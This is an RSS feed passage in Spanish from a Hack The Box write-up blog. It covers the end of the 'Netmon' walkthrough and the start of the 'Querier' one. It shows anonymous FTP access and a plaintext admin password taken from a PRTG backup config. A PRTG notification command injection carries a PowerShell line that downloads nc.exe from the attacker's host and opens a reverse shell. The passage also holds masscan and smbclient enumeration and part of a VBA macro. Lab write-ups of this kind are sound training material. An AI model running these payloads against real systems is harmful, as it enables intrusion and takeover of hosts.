&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~# ftp 10.10.10.152
Connected to 10.10.10.152.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Microsoft FTP Service
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.152:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Anonymous access allowed, send identity &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;e-mail name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; as password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; User logged in.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is Windows_NT.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
11-20-16  09:46PM       &amp;lt;DIR&amp;gt;          &lt;span class=&#34;nv&#34;&gt;$RECYCLE&lt;/span&gt;.BIN
02-02-19  11:18PM                 &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; .rnd
11-20-16  08:59PM               &lt;span class=&#34;m&#34;&gt;389408&lt;/span&gt; bootmgr
07-16-16  08:10AM                    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; BOOTNXT
02-03-19  07:05AM       &amp;lt;DIR&amp;gt;          Documents and Settings
02-25-19  09:15PM       &amp;lt;DIR&amp;gt;          inetpub
03-06-19  02:04PM            &lt;span class=&#34;m&#34;&gt;738197504&lt;/span&gt; pagefile.sys
07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
02-25-19  09:56PM       &amp;lt;DIR&amp;gt;          Program Files
02-02-19  11:28PM       &amp;lt;DIR&amp;gt;          Program Files &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;x86&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
02-25-19  09:56PM       &amp;lt;DIR&amp;gt;          ProgramData
02-03-19  07:05AM       &amp;lt;DIR&amp;gt;          Recovery
02-03-19  07:04AM       &amp;lt;DIR&amp;gt;          System Volume Information
02-03-19  07:08AM       &amp;lt;DIR&amp;gt;          Users
02-25-19  10:49PM       &amp;lt;DIR&amp;gt;          Windows
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Users
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; CWD &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
ftp&amp;gt; ls
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
02-25-19  10:44PM       &amp;lt;DIR&amp;gt;          Administrator
02-02-19  11:35PM       &amp;lt;DIR&amp;gt;          Public
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Public
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; CWD &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
ftp&amp;gt; ls
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
02-03-19  07:05AM       &amp;lt;DIR&amp;gt;          Documents
07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          Downloads
07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          Music
07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          Pictures
02-02-19  11:35PM                   &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; user.txt
07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          Videos
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
ftp&amp;gt; bin
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; Type &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to I.
ftp&amp;gt; get user.txt
local: user.txt remote: user.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; bytes received in 0.37 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.0877 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; 


root@sckull:~# cat user.txt 
dd58ce67b49e15105e88096c8d9255a5
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;enumeracion-ftp&#34;&gt;ENUMERACION FTP&lt;/h2&gt;
&lt;p&gt;Al realizar una enumeracion a los directorios por medio de ftp encontramos un programa llamado &lt;code&gt;PRTG Network Monitor&lt;/code&gt; el cual funciona para monitoreo de red, el uso de ancho de banda o tiempo de actividad.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-11%2019-26-10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http---puerto-80&#34;&gt;HTTP - puerto 80&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-06%2013-19-49.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizando una busqueda por google nos encontramos con exploits para este monitor de red, pero para ello debemos de logearnos al portal web, el usuario y contraseña por default (prtgadmin:prtgadmin) no funcionan, por lo que yendo ún poco mas profundo encontramos un pequeño post en reddit que hablan acerca de un archivo &amp;lsquo;PRTG Configuration.dat&amp;rsquo; que puede contener contraseñas que no estan encriptadas de igual forma en archivo &amp;lsquo;PRTG Configuration.old&amp;rsquo;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.reddit.com/r/sysadmin/comments/862b8s/prtg_gave_away_some_of_your_passwords/&#34;&gt;&lt;strong&gt;reddit/prtg_gave_away_some_of_your_passwords&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-11%2019-37-34.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Sabiendo esto buscamos dentro de la maquina los archivos, por lo general se encuentran en el misma direccion que el programa (&lt;code&gt;../Program Files/PRTG Network Monitor/PRTG configuration.dat&lt;/code&gt;) pero, al parecer el administrador cambio la direccion. Para enumerar archivos de manera rapida utilizamos Filezilla.&lt;/p&gt;
&lt;p&gt;Los archivos los pudimos encontrar en &lt;code&gt;/Users/All Users/Paessler/PRTG Network Monitor&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-11%2019-42-17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hicimos una busqueda de contraseñas dentro de los archivos y en &lt;code&gt;PRTG Configuration.old.bak&lt;/code&gt; encontramos una contraseña para el usuario &lt;code&gt;prtgadmin&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;lt;dbpassword&amp;gt;
	&amp;lt;!-- User: prtgadmin --&amp;gt;
	    PrTg@dmin2018
&amp;lt;/dbpassword&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-11%2019-45-36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al intentar logearnos con las credenciales (&lt;code&gt;prtgadmin:PrTg@dmin2018&lt;/code&gt;) el portal no nos deja, por lo que podemos ver el archivo en donde se encuentra la contraseña es un archivo backup y fue creado en el año de 2018, que tal si le cambiamos el año a la contraseña (&lt;code&gt;PrTg@admin2018&lt;/code&gt;) al actual &amp;ndash;&amp;gt; &lt;code&gt;PrTg@dmin2018&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-13%2016-55-17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tenemos una sesion abierta dentro del portal, ahora que estamos dentro podemos hacer inyeccion de comandos.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.codewatch.org/blog/?p=453&#34;&gt;&lt;strong&gt;PRTG &amp;lt; 18.2.39 Command Injection Vulnerability&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-13%2017-07-17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nos dirigimos a Setup &amp;gt; Account Settings &amp;gt; Notifications&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-13%2017-08-15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Creamos una nueva notificacion y marcamos la opcion de &lt;code&gt;EXECUTE PROGRAM&lt;/code&gt;, dentro de los parametros escribimos lo siguiente:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-14%2006-03-30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;netcat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;wget http://10.10.12.122/nc.exe -OutFile C:\nc.exe; C:\nc.exe 10.10.12.122 7878 -e cmd&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Antes de ejecutar el comando debemos de poner a la escucha nuestra maquina para poder descargar &lt;code&gt;nc.exe&lt;/code&gt; (netcat), luego de esto ejecutamos nuestra notificacion (test). Para ejecutarlo debemos de ir a donde esta la lista de notificaciones selecionamos la nuestra y en la parte derecha presionamos la campanita para hacer un test.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-14%2005-13-58.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-14%2006-00-43.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Observamos por medio del servicio ftp que el archivo &lt;code&gt;nc.exe&lt;/code&gt; se creó exitosamente en &lt;code&gt;C:/nc.exe&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-14%2006-00-47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y obtenemos una shell como administrador.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-14%2006-00-50.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y nuestra bandera de &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/netmon/Screenshot%20from%202019-03-14%2006-02-00.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/netmon/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/netmon/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Querier</title>
        <link>https://sckull.github.io/posts/querier/</link>
        <pubDate>Sat, 22 Jun 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 22 Jun 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/querier/</guid>
        <description>Querier es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Querier es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/querier/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Querier&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Medio&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.125&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/2570&#34;&gt;mrh4sh&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190&#34;&gt;egre55&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan&#34;&gt;MASSCAN&lt;/h2&gt;
&lt;p&gt;Utilizando la herramienta masscan para hacer un escaneo rapido de todos los puertos en tcp y udp&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;masscan -p1-65535,U:1-65535 10.10.10.125 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-02-19 05:54:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 49665/tcp on 10.10.10.125                                 
Discovered open port 49666/tcp on 10.10.10.125                                 
Discovered open port 49670/tcp on 10.10.10.125                                 
Discovered open port 47001/tcp on 10.10.10.125                                 
Discovered open port 135/tcp on 10.10.10.125                                   
Discovered open port 49664/tcp on 10.10.10.125                                 
Discovered open port 5985/tcp on 10.10.10.125                                  
Discovered open port 49668/tcp on 10.10.10.125                                 
Discovered open port 49671/tcp on 10.10.10.125                                 
Discovered open port 139/tcp on 10.10.10.125 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/querier/Screenshot_20190219_000350.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Al realizar una busqueda de archivos y directorios en el &lt;code&gt;puerto 5985&lt;/code&gt; no encontramos nada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/querier/Screenshot_20190220_181124.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;smbclient&#34;&gt;SMBCLIENT&lt;/h2&gt;
&lt;p&gt;Enumerando &lt;code&gt;SHARENAMES&lt;/code&gt; con smbclient encontramos &lt;code&gt;Reports&lt;/code&gt; e intentamos conectarnos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient -L 10.10.10.125
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro de &lt;code&gt;Reports&lt;/code&gt; econtramos un archivo xlsm el cual no contiene nada&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.125&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Reports

&lt;span class=&#34;s1&#34;&gt;&amp;#39;Currency Volume Report.xlsm&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;binwalk&#34;&gt;Binwalk&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/querier/Screenshot_20190220_181033.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al utilizar &lt;code&gt;BinWalk&lt;/code&gt; para analizar el archivo en busqueda de archivos ocultos encontramos dentro del archivo un macro con el siguiente codigo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vb&#34; data-lang=&#34;vb&#34;&gt;&lt;span class=&#34;c&#34;&gt;Rem Attribute VBA_ModuleType=VBADocumentModule
&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;Option&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;VBASupport&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;

&lt;span class=&#34;c&#34;&gt;&amp;#39; macro to pull data for client volume reports
&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&amp;#39; further testing required
&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;Private&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;Sub&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;Dim&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;As&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ADODB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Connection&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;Dim&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rs&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;As&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ADODB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Recordset&lt;/span&gt;

